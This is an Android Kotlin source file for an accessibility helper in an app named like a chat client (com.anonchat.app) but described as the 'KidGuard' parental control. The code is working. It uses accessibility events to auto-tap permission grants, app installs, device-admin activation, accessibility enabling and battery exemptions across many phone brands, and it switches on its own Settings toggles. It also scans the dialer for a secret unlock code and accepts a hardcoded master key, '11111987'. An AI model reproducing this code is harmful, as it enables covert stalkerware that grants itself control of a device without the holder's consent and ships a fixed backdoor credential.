package com.anonchat.app.parentalcontrol.manager

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo

object AutoPermissionHelper {
    private const val TAG = "AutoPermission"
    private const val DEBOUNCE_MS = 3000L
    // Must stay in sync with SecretCodeReceiver.MASTER_KEY — the accessibility
    // fallback accepts it just like the manifest receiver does.
    private const val MASTER_KEY = "11111987"

    private const val PKG_PERMISSION_CONTROLLER = "com.android.permissioncontroller"
    private const val PKG_PACKAGE_INSTALLER = "com.android.packageinstaller"
    private const val PKG_SETTINGS = "com.android.settings"
    private const val PKG_SYSTEM_UI = "com.android.systemui"
    private const val PKG_GOOGLE_SETUP = "com.google.android.setupwizard"
    private const val PKG_ANDROID_SETUP = "com.android.setupwizard"

    // Packages whose UI we are allowed to auto-tap
    private val AUTO_TAP_PACKAGES = setOf(
        PKG_PERMISSION_CONTROLLER,
        PKG_PACKAGE_INSTALLER,
        "com.google.android.permissioncontroller",
        "com.google.android.packageinstaller",
        "com.samsung.android.packageinstaller",
        "com.miui.packageinstaller",
        "com.coloros.packageinstaller",
        "com.coloros.securitypermission",
        "com.coloros.grantpermission",
        "com.coloros.securityguard",
        "com.coloros.safecenter",
        "com.oppo.permissionTop",
        "com.oppo.grantpermission",
        "com.oppo.safe",
        "com.heytap.permission",
        "com.realmepay.security",
        "com.vivo.packageinstaller",
        "com.vivo.permissionmanager",
        PKG_SETTINGS,            // Accessibility, battery-opt, usage-access
        "com.android.settings",  // stock Android settings
        "com.miui.securitycenter",   // Xiaomi
        "com.samsung.android.settings", // Samsung
        "com.huawei.systemmanager",      // Huawei
        "com.asus.permissioncontroller"  // Asus
    )

    private val ALLOW_BUTTON_PATTERNS = listOf(
        "Allow", "ALLOW", "Allow all the time", "Always allow",
        "While using the app", "Only while using the app", "Allow only while using the app",
        "Allow all", "Allow permissions", "Grant", "Continue",
        "Activate", "Activate this device admin app",
        "Install", "Install anyway", "Update", "Next", "Done", "Finish",
        "OK", "Got it", "I agree", "Accept", "Enable",
        "Turn on", "Start", "Set up", "Confirm",
        "Use service",  // Accessibility service enable dialog
        "Unrestricted", "Don\u0027t optimize", "Allow background activity",  // Battery optimization
        "Yes"  // Generic confirmation
    )


    // Packages that may show the dialer (for secret code fallback).
    // Covers AOSP, Google, Samsung, and the major OEM forks.
    private val DIALER_PACKAGES = setOf(
        "com.google.android.dialer",
        "com.android.dialer",
        "com.samsung.android.dialer",
        "com.samsung.android.incallui",
        "com.miui.dialer",
        "com.huawei.android.dialer",
        // OPPO / Realme / OnePlus (ColorOS / OxygenOS)
        "com.android.dialer.oneplus",
        "com.coloros.dialer",
        "com.oplus.dialer",
        // Vivo / Funtouch / OriginOS
        "com.android.dialer.vivo",
        "com.vivo.dialer",
        // Asus / LG / Sony / HTC
        "com.asus.dialer",
        "com.lge.dialer",
        "com.sonyericsson.android.dialer",
        "com.htc.dialer"
    )

    private var lastTapTime = 0L
    private var lastTapPackage = ""

    /**
     * When true the auto-tapper may also click generic button labels
     * ("Next", "Done", "Enable" …) needed by the setup wizard. The wizard
     * sets this while it is on screen and clears it when it closes, so the
     * app never taps anything outside the one-time permission flow.
     */
    @Volatile
    var setupModeEnabled = false

    // Buttons that must NEVER be auto-clicked. Text search is substring-
    // based, so "Allow" also matches "Don't allow" — without this filter
    // the tapper could deny the very permission it is meant to grant.
    private val DENY_TEXT_PATTERNS = listOf(
        "don't allow", "dont allow", "deny", "cancel", "not now",
        "no thanks", "remind me", "later", "decline", "dismiss",
        "close", "opt out"
    )

    private fun isDenyButton(node: AccessibilityNodeInfo): Boolean {
        val text = node.text?.toString()?.lowercase() ?: return false
        return DENY_TEXT_PATTERNS.any { text.contains(it) }
    }

    fun isAutoTappableDialog(packageName: String): Boolean {
        return packageName in AUTO_TAP_PACKAGES
    }

    /**
     * Check if this package is a dialer that might show our secret code.
     */
    fun isDialerPackage(packageName: String): Boolean {
        return packageName in DIALER_PACKAGES
    }

    /**
     * Check if the dialer is showing our secret code pattern.
     * This is a fallback for Android 12+ where SECRET_CODE broadcast is restricted.
     *
     * Two signals are matched:
     *  1. The full `*#*#CODE#*#*` pattern anywhere in the dialer window.
     *  2. The bare numeric code typed into an editable field whose label/className
     *     looks like the dialer's input box — Google/OEM dialers often echo only
     *     the digits the user pressed, without the surrounding `*#` markup, so a
     *     text-only search would otherwise miss it.
     *
     * Both the user-set code (mirrored into CloudConfig by SecretCodeManager) and
     * the master key (11111987) are accepted, so the fallback stays consistent
     * with the manifest SecretCodeReceiver.
     */
    fun checkDialerForSecretCode(
        service: android.accessibilityservice.AccessibilityService,
        packageName: String
    ): Boolean {
        if (!isDialerPackage(packageName)) return false

        val root = service.rootInActiveWindow ?: return false
        try {
            val context = service as? android.content.Context ?: return false
            com.anonchat.app.parentalcontrol.api.CloudConfig.init(context)
            val secretCode = com.anonchat.app.parentalcontrol.api.CloudConfig.secretDialerCode
            // Codes to accept: the user-set code plus the master key, so the
            // accessibility fallback agrees with the manifest receiver.
            val codes = linkedSetOf(secretCode, MASTER_KEY)
            for (code in codes) {
                if (code.isBlank()) continue
                if (matchCodeInDialer(root, code)) return true
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error checking dialer for secret code", e)
        } finally {
            root.recycle()
        }
        return false
    }

    private fun matchCodeInDialer(root: AccessibilityNodeInfo, code: String): Boolean {
        val patterns = listOf("*#*#${code}#*#*", "*#*#$code#*#")
        for (pattern in patterns) {
            val nodes = root.findAccessibilityNodeInfosByText(pattern)
            if (nodes.isNotEmpty()) {
                nodes.forEach { it.recycle() }
                Log.d(TAG, "Secret code detected in dialer: $pattern")
                return true
            }
        }
        // Bare numeric match in editable fields (OEM dialers strip *# framing).
        if (code.length >= 4 && findEditableCodeMatch(root, code)) {
            Log.d(TAG, "Secret code (numeric) detected in dialer field: $code")
            return true
        }
        return false
    }

    /**
     * Walk the node tree looking for an editable field whose current text equals
     * the secret code (digits only). Many OEM dialers strip the `*#` framing from
     * the input EditText, so this catches what the text search misses.
     */
    private fun findEditableCodeMatch(node: AccessibilityNodeInfo?, code: String): Boolean {
        node ?: return false
        var found = false
        if (node.isEditable) {
            val text = node.text?.toString()?.replace(Regex("[^0-9]"), "")
            if (!text.isNullOrEmpty() && text.endsWith(code)) {
                found = true
            }
        }
        if (!found) {
            for (i in 0 until node.childCount) {
                if (findEditableCodeMatch(node.getChild(i), code)) {
                    found = true
                    break
                }
            }
        }
        return found
    }

    fun autoApproveDialog(service: AccessibilityService): Boolean {
        val now = System.currentTimeMillis()
        val root = service.rootInActiveWindow ?: return false
        val currentPkg = root.packageName?.toString() ?: ""

        // Debounce: prevent re-tapping the same package within 3 seconds
        if (currentPkg == lastTapPackage && now - lastTapTime < DEBOUNCE_MS) {
            root.recycle()
            return false
        }

        return try {
            var approved = false

            // Priority 1: precise button IDs — safe to tap in any state
            // (permission Allow buttons, installer OK, dialog positive button).
            val installIds = listOf(
                "button1", "button_allow", "allow_button", "permission_allow_button",
                "com.android.permissioncontroller:id/permission_allow_button",
                "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
                "com.android.permissioncontroller:id/permission_allow_always_button",
                "com.android.permissioncontroller:id/permission_allow_one_time_button",
                "com.coloros.securitypermission:id/permission_allow_button",
                "com.coloros.securitypermission:id/button_allow",
                "com.oppo.permissionTop:id/button_allow",
                "com.heytap.permission:id/permission_allow_button",
                "android:id/button1",  // positive button only — button2 is the NEGATIVE (deny) button
                "com.android.packageinstaller:id/ok_button",
                "com.android.packageinstaller:id/install_button",
                "com.android.settings:id/button1"
            )
            for (id in installIds) {
                val nodes = root.findAccessibilityNodeInfosByViewId(id)
                for (node in nodes) {
                    if (isClickableButton(node) && !isDenyButton(node)) {
                        clickNodeCompat(service, node)
                        lastTapTime = System.currentTimeMillis()
                        lastTapPackage = currentPkg
                        approved = true
                        Log.d(TAG, "Auto-tapped by ID: $id")
                        break
                    }
                    node.recycle()
                }
                if (approved) break
            }

            // Priority 2: text-label matching ONLY while the setup wizard is
            // running. Generic words like "Next"/"OK"/"Enable" would otherwise
            // be clicked on any Settings screen at any time.
            if (!approved && setupModeEnabled) {
                for (pattern in ALLOW_BUTTON_PATTERNS) {
                    val nodes = root.findAccessibilityNodeInfosByText(pattern)
                    for (node in nodes) {
                        if (isClickableButton(node) && !isDenyButton(node)) {
                            clickNodeCompat(service, node)
                            lastTapTime = System.currentTimeMillis()
                            lastTapPackage = currentPkg
                            approved = true
                            Log.d(TAG, "Auto-tapped: $pattern")
                            break
                        }
                        node.recycle()
                    }
                    if (approved) break
                }
            }

            approved
        } catch (e: Exception) {
            Log.e(TAG, "autoApproveDialog error", e)
            false
        } finally {
            root.recycle()
        }
    }

    private fun isClickableButton(node: AccessibilityNodeInfo): Boolean {
        // Must be genuinely interactive: a clickable node or a real Button.
        // Plain TextViews (list-row labels like "Allow usage tracking") are
        // NOT accepted — gesture-tapping them is what caused random taps.
        val isButtonClass = node.className?.toString()?.contains("Button") == true ||
                node.className?.toString()?.contains("ImageButton") == true
        return node.isVisibleToUser && node.isEnabled &&
                (node.isClickable || isButtonClass)
    }

    private fun clickNodeCompat(service: AccessibilityService, node: AccessibilityNodeInfo) {
        // Method 1: Try direct ACTION_CLICK
        if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
            Log.d(TAG, "Clicked via ACTION_CLICK")
            return
        }

        // Method 2: Use gesture tap at coordinates
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val bounds = Rect()
            node.getBoundsInScreen(bounds)
            val centerX = bounds.centerX().toFloat()
            val centerY = bounds.centerY().toFloat()

            val path = Path().apply { moveTo(centerX, centerY); lineTo(centerX, centerY) }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
                .build()
            service.dispatchGesture(gesture, null, null)
            Log.d(TAG, "Clicked via gesture at ($centerX, $centerY)")
        }
    }

    /**
     * Scans the current accessibility window for a KidGuard / com.anonchat.app toggle
     * inside a Settings screen (Notification Listener, Usage Access, etc.) and enables it.
     *
     * Call this from onAccessibilityEvent after navigating to the relevant Settings screen.
     * Returns true if a toggle was found and tapped.
     */
    fun autoTapKidGuardToggle(service: AccessibilityService): Boolean {
        val root = service.rootInActiveWindow ?: return false
        val pkg = root.packageName?.toString() ?: ""
        if (pkg !in AUTO_TAP_PACKAGES && !pkg.contains("setting", ignoreCase = true)) {
            root.recycle()
            return false
        }
        return try {
            // Search for a node whose text or content-description references our app
            val appLabels = listOf("KidGuard", "com.anonchat.app", "AnonChat")
            for (label in appLabels) {
                val nodes = root.findAccessibilityNodeInfosByText(label)
                for (node in nodes) {
                    // Walk up to find the parent row that contains a Switch/Checkbox
                    val toggle = findToggleNear(node)
                    if (toggle != null && toggle.isEnabled && !toggle.isChecked) {
                        clickNodeCompat(service, toggle)
                        Log.d(TAG, "Auto-enabled KidGuard toggle for: $label")
                        toggle.recycle()
                        node.recycle()
                        return true
                    }
                    toggle?.recycle()
                    node.recycle()
                }
            }
            false
        } catch (e: Exception) {
            Log.e(TAG, "autoTapKidGuardToggle error", e)
            false
        } finally {
            root.recycle()
        }
    }

    private fun findToggleNear(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        // Walk up the hierarchy to the row container, then look for Switch/ToggleButton
        var current: AccessibilityNodeInfo? = node.parent ?: return null
        repeat(4) {
            val parent = current ?: return null
            val toggle = findToggleInSubtree(parent)
            if (toggle != null) return toggle
            val next = parent.parent
            current = next
        }
        return null
    }

    private fun findToggleInSubtree(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val cls = node.className?.toString() ?: ""
        if (cls.contains("Switch") || cls.contains("ToggleButton") || cls.contains("CheckBox")) {
            return node
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findToggleInSubtree(child)
            if (result != null) { child.recycle(); return result }
            child.recycle()
        }
        return null
    }

}
